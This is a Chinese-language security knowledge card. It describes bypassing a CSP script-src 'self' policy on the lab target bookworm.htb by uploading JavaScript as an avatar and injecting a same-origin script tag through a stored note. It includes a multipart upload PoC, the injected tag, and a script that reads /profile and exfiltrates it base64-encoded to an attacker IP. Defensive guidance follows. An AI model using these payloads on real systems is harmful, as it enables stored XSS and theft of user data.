---
id: web-generic-xss-csp-self-uploaded-js-same-origin-script
title: CSP script-src 'self' 绕过：上传任意 JS 为头像，note 注入 <script src=/static/img/uploads/N> 同源执行
type: scenario
domain: web
path: web/generic/xss
technique: csp-self-uploaded-same-origin-script
aliases:
- CSP self 绕过
- 上传 JS 当脚本
- 同源上传文件 XSS
- script-src self bypass
- /static/img/uploads/
- Bookworm CSP bypass
tags:
- web
- xss
- csp
- bypass
- file-upload
- same-origin
- stored-xss
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V304
  verified_at: '2026-11-08T11:43:38+08:00'
  notes: 已对照 content.md 与 img09-24 核对：CSP script-src 'self'、note 存储型 HTML 注入、头像上传 filename=xianzhi.png 内容为 alert("xianzhi");、/static/img/uploads/14 同源引用并弹窗、fetch+btoa 外带 /profile 均与原文一致。未验证点：未复现浏览器执行过程；原文未说明上传响应 MIME/Content-Type 细节。
---

## 一句话结论

目标 CSP 为 `script-src 'self'`（禁止内联脚本），但 note 字段原样渲染 HTML、头像上传允许任意内容并同源托管在 `/static/img/uploads/<id>`；攻击者把 JS 代码作为“头像图片”上传，再在 note 注入 `<script src="/static/img/uploads/14"></script>`，浏览器按同源脚本加载并执行上传文件里的 JS，CSP 被完全绕过；该 JS 可读取 `/profile`/订单页并把数据 base64 外带到攻击者服务器。

## 原理

- **CSP 的信任边界**：`script-src 'self'` 只允许同源 URL 的脚本，内联 `<script>alert(1)</script>` 会被 `_inline` 规则拦截（本题控制台报 `blocked the loading of a resource at inline ("script-src")`）。但同源任意路径的脚本仍被允许。
- **同源文件上传**：头像上传接口只按表单字段接收文件（filename `xianzhi.png`、Content-Type `image/png`），未校验实际内容；文件保存后由应用以 `/static/img/uploads/<id>` 同源提供（URL 无扩展名）。
- **把上传文件当脚本**：攻击者上传的“图片”实际内容是 JS；在 note 中写入 `<script src="/static/img/uploads/14"></script>` 后，页面从同源加载该文件。若响应缺少 `X-Content-Type-Options: nosniff` 或 MIME 可被浏览器嗅探/接受，浏览器会将其作为脚本执行；本题在浏览器控制台成功弹出 `xianzhi`。
- **为什么 note 是入口**：basket/order 的 Note 字段被原样拼接进 HTML（未转义），形成存储型 HTML 注入；CSP 阻止内联后，同源脚本标签成为绕过手段。
- **外带**：执行后的 JS 可用 `fetch("http://bookworm.htb/profile")` 读同源页面，`btoa(await res.text())` 编码后通过 `fetch("http://attacker/?url=...&data=...")` 外带；结合订单 IDOR 可读取其他用户订单/备注。
- **边界**：若上传目录使用独立域名、强制 `Content-Disposition: attachment`、`X-Content-Type-Options: nosniff` 且 MIME 为 image/png，或 CSP 使用 nonce/hash 且不允许 self，则本链失效；上传内容审计/杀毒也可能拦截。

## 触发条件

- 页面 CSP 为 `script-src 'self'`（允许同源脚本、禁止内联）。
- 存在存储型 HTML 注入点（本卡为 basket/order Note）且未做 HTML 转义。
- 存在同源文件上传（头像/图片等），内容不受限或可绕过类型检查，且上传文件可通过可预测 URL 访问。
- 上传响应的 MIME/头允许浏览器将其作为脚本执行（无 nosniff 或 Content-Type 可接受）。
- 受害用户（或管理 bot）会查看被注入的页面。

## 利用步骤

1. 确认 CSP：抓包看 `Content-Security-Policy: script-src 'self'`，在控制台验证内联脚本被拦。
2. 找一个同源上传点：上传头像，记录返回/页面中的 URL（本例 `<img src="/static/img/uploads/14">`）。
3. 上传 JS 内容作为头像文件（filename 用 `.png` 伪装，内容为 JS）；确认 URL 可直接访问且返回内容未被改写。
4. 在 note/评论等 HTML 注入点写入 `<script src="/static/img/uploads/14"></script>` 并保存。
5. 用受害者会话访问该订单/购物篮页面；脚本从同源加载并执行。
6. JS 读取 `/profile`、订单详情等，base64 编码后外带到攻击者服务器；解码获取数据。
7. 记录上传 URL、note 请求、CSP 响应头与执行证据。

## PoC

上传 JS 作为头像（Burp multipart）：

```http
POST /profile/avatar HTTP/1.1
Host: bookworm.htb
Cookie: session=<...>
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="avatar"; filename="xianzhi.png"
Content-Type: image/png

alert("xianzhi");
------x--
```

注入 note：

```html
<script src="/static/img/uploads/14"></script>
```

外带 JS（原文）：

```javascript
async function sendrequest(url) {
  const attacker = "http://10.10.16.12/?url=" + encodeURIComponent(url);
  fetch(url).then(async res => {
    fetch(attacker + "&data=" + btoa(await res.text()));
  });
}
sendrequest("http://bookworm.htb/profile");
```

## 变体与关联

- **同源 JSONP**：若同源有 callback 参数拼接的 JSONP，可直接 `<script src="?callback=...">`，见 [[web-generic-xss-csp-self-jsonp-callback-bypass]]；本卡是“上传任意 JS 文件”的另一条 self 绕过。
- **其他同源 gadget**：上传 `.js`、SVG/HTML、Service Worker、`import()`、`<link rel=preload>` 等；关键是同源 URL 能返回可执行 JS。
- **MIME 边界**：若服务端设置 `nosniff` 且 Content-Type 为 image/png，浏览器不会执行；可尝试上传实际 `.js` 扩展、修改 Content-Type、找其他不校验的下载/预览端点。
- **影响放大**：结合订单 IDOR 可读其他用户数据；结合 CSRF/管理 bot 可打后台。

## 检测与防御

- **CSP**：使用 nonce/hash + `strict-dynamic`，不要只依赖 `script-src 'self'`；将上传域与主站分离（独立域名/沙箱域），上传文件强制 `Content-Disposition: attachment` 与 `X-Content-Type-Options: nosniff`。
- **上传**：校验真实文件类型/内容（magic bytes、图像解码）、限制扩展名与大小、重命名并去除可执行内容；上传目录不解析脚本。
- **输出**：对 note/评论等用户 HTML 做转义或白名单 sanitize；不要原样拼接。
- **检测**：CSP 违规报告；note 中出现 `<script src=`、`onerror`、`javascript:`；上传文件内容含 JS 关键字（`fetch`、`btoa`、`<script`）；同源上传 URL 被作为 script src 引用。
